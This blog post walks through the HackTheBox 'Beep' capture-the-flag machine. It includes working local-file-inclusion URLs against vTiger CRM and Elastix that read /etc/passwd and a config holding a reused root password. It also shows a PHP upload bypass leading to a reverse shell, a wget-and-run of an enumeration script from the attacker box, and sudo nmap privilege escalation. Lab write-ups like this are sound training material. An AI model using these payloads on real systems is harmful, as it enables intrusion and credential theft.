---
title: "Walk-through of Beep from HackTheBox"
header: 
  teaser: /assets/images/2020-05-05-22-24-23.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - gobuster
  - LFI
  - Linux
---

## Machine Information

![Beep](/assets/images/2020-05-05-22-24-23.png)

Beep has a large list of running services, which can make it a bit challenging to find the
correct entry method. Skills required are basic knowledge of Linux and enumerating ports and services. Skills learned are web-based fuzzing, identifying known exploits and exploiting local file inclusion vulnerabilities.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
| Link To Machine | [HTB - 005 - Easy - Beep](https://www.hackthebox.eu/home/machines/profile/5) |
| Machine Release Date | 15th March 2017 |
| Date I Completed It | 16th July 2019 |
| Distribution used | Kali 2019.1 – [Release Info](https://www.kali.org/news/kali-linux-2019-1-release/) |

### Initial Recon

Check for open ports with Nmap:

```text
root@kali:~/htb/beep# nmap -sS -sC -sV -oA beep -p- -T4 10.10.10.7

Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-21 22:39 BST
Nmap scan report for 10.10.10.7
Host is up (0.039s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: IMPLEMENTATION(Cyrus POP3 server v2) UIDL RESP-CODES APOP PIPELINING USER STLS TOP LOGIN-DELAY(0) AUTHRESP-CODE EXPIRE(NEVER)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            874/udp  status
|_  100024  1            877/tcp  status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: IMAP4rev1 Completed ACL URLAUTHA0001 OK UIDPLUS THREAD=REFERENCES IDLE ANNOTATEMORE IMAP4 LIST-SUBSCRIBED LISTEXT CHILDREN CATENATE ID THREAD=ORDEREDSUBJECT UNSELECT X-NETSCAPE MAILBOX-REFERRALS ATOMIC STARTTLS RENAME SORT BINARY RIGHTS=kxte MULTIAPPEND LITERAL+ CONDSTORE NAMESPACE QUOTA NO SORT=MODSEQ
443/tcp   open  ssl/https?
|_ssl-date: 2019-07-21T21:38:52+00:00; -3m49s from scanner time.
877/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
Host script results:
|_clock-skew: mean: -3m49s, deviation: 0s, median: -3m49s
```

Lots of ports open, start on normal path looking at port 80.

### Gaining Access

Opening website at http://10.10.10.7 on port 80 automatically redirects to port 443:
![Website](/assets/images/2020-05-11-22-37-57.png)

Login page for something called Elastix. Quick search for default credentials finds this [info](https://dariusfreamon.wordpress.com/2013/11/01/elastix-pbx-default-credentials/). Tried those plus other obvious ones but no luck, so try gobuster to find anything hidden:

```text
root@kali:~/htb/beep# gobuster dir -k -u https://10.10.10.7 -w /usr/share/wordlists/dirb/big.txt
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.7
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/07/21 22:53:47 Starting gobuster
===============================================================
/vtigercrm (Status: 301)
```

Having a look at the site: https://10.10.10.7/vtigercrm - We find CRM is version is 5.1.0

Have a look on searchsploit:

```text
root@kali:~/htb/beep# searchsploit vtiger
vTiger CRM 5.1.0 - Local File Inclusion  |  exploits/php/webapps/18770.txt
```

Exploit shows how to use LFI to navigate to sub-directories, use this in browser to get passwd file:

```text
https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```

Press ctrl-u to view source, shows as a proper list instead of jumble.

Copy and paste in to vi, remove all users with no login by doing:

```text
:g/nologin/d
```

Then remove non interesting logins, and cut from cursor to end of line with d$ for each remaining user to give simple list like this:

```text
root
cyrus
asterisk
fanis
```

No obvious way forward with this, so save for possible brute force later and look for another path.

Going back to at Elastix, I find it's prone to LFI exploit:

```text
root@kali:~/htb/beep# searchsploit elastix
-------------------------------------------------------------------------------- 
Exploit Title                                    |  Path
                                                 | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------- 
Elastix 2.2.0 - 'graph.php' Local File Inclusion | exploits/php/webapps/37637.pl
-------------------------------------------------------------------------------- 
```

Exploit shows how to expose the Elastix config, use this in browser:

```text
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action
```

This exposes the user **AMPortal**, with password **jEhdlekWmdjE**

The machine is vulnerable to password reuse, so it's possible to logon as root using this password:

```text
root@kali:~/htb/beep# ssh root@10.10.10.7
root@10.10.10.7's password:   <---- enter jEhdlekWmdjE found above
Last login: Tue Jul 16 11:45:47 2019
Welcome to Elastix 
----------------------------------------------------
To access your Elastix System, using a separate workstation (PC/MAC/Linux)
```

### User and Root Flags

Now have an ssh session on to the machine, check who we are logged on as:

```text
whoami
root
```

On as root user, so can get both flags:

```text
cat /home/fanis/user.txt
cat /root/root.txt
```

## Alternative Method

Brief notes of a different way to complete the box.

Log in to https://10.10.10.7/vtigercrm - user **admin**, password **jEhdlekWmdjE**

Navigate to Settings - Company Details

There is a file upload vulnerability where you can upload a jpg but it doesn't properly sanitise. So you can have shell.php.jpg, then use [Tamper Data](https://addons.mozilla.org/en-GB/firefox/addon/tamper-data-for-ff-quantum/) or [Burp](https://portswigger.net/burp) (already installed on Kali) to intercept request and remove double extension. Should then upload as a php file.

Have an nc -lvp 1234 waiting in a terminal and should get a reverse shell.

We are then logged in as user asterisk, and can get user flag from fanis folder.
When checking we see /tmp, is world writeable, so CD to there.

Start web server on Kali:

```text
root@kali:~/htb/beep# service apache2 start
```

Switch back to the box, pull LinEnum to it and run:

```text
wget 10.10.14.10/LinEnum.sh
bash LinEnum.sh
```

Shows what commands can use sudo without password (same as doing sudo -l). Has nmap in list.

Use nmap to escalate to root:

```text
sudo nmap --interactive 
!sh
whoami
root
```

I can now get the user and root flags as above now.
